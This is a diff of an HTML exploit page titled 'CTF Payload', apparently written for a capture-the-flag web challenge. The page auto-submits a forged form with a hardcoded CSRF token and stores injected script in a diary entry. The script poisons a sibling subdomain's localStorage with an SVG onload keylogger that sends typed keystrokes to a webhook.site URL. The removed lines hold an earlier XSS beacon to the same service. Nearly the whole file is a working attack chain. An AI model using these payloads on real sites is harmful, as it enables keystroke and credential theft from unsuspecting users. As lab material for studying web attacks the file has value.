@@ -1,24 +1,52 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF Payload</title>
+</head>
 <body>
 
-<form id="feeling"
-      action="https://diary.owley-madison.jeopardy.websec.saarland/entry"
-      method="POST">
-  <textarea name="content">
-<script>
-new Image().src =
-        "https://webhook.site/d002c40d-2ffe-4314-8350-87d66eeb6df0/?k=" +
-        encodeURIComponent("testing");
-</script>
-  </textarea>
+<h3>Loading…</h3>
+<form id="feeling" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST">
+                    <div class="form-group" >
+                        <label for="feelings">Tell me about your Feelings:</label>
+                        <textarea class="form-control" id="feelings" name="content" rows="3">
+				This is a good try
+				<iframe id="match_frame" src="//match.owley-madison.jeopardy.websec.saarland/" style="width:0px;height:0px"></iframe>
+				<script>
+					document.domain = "owley-madison.jeopardy.websec.saarland";
+					var jsCode = "</option></select><svg onload=\"(function(){let buffer='';document.addEventListener('keydown',function(e){if(e.key.length===1) buffer+=e.key;if(buffer.length>5){new Image().src='https://webhook.site/3e710efb-fd47-4e06-a44d-0cc7f9e07422?data='+encodeURIComponent(buffer);buffer='';}})})();\">";
+					
+
+					//const jsCode = JSON.stringify(jsCode);
+					console.log(jsCode);
+					
+					var matchiframe = document.getElementById("match_frame");
+					matchiframe.addEventListener("load", () => { 
+						console.log("Iframe has loaded!");
+						var locStorage = window.match_frame.contentWindow.localStorage;
+						var favorites = locStorage.getItem('favorites');
+						favorites = new Set(favorites ? JSON.parse(favorites) : []);
+						favorites.add(jsCode)
+            					favorites = Array.from(favorites);
+            					locStorage.setItem('favorites', JSON.stringify(favorites));
+						//locStorage.setItem("favorites", jsCode); 
+					});
+									
+				</script>
+			
+			</textarea>
+                    </div>
+                <input name="csrfmiddlewaretoken" type="hidden" value="1arHEJtOgJc3aGybqajq7vosWZQYU61ia3sDoiSvy0Sl4j4NvI7IVKZFSIb1sE1y">
+
 </form>
+<script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
+<script> 
+window.onload = () => {
+console.log("ready to go");
+	document.getElementById("feeling").submit();
 
-<script>
-  document.getElementById("feeling").submit();
+};
 </script>
-
-
-
 </body>
 </html>
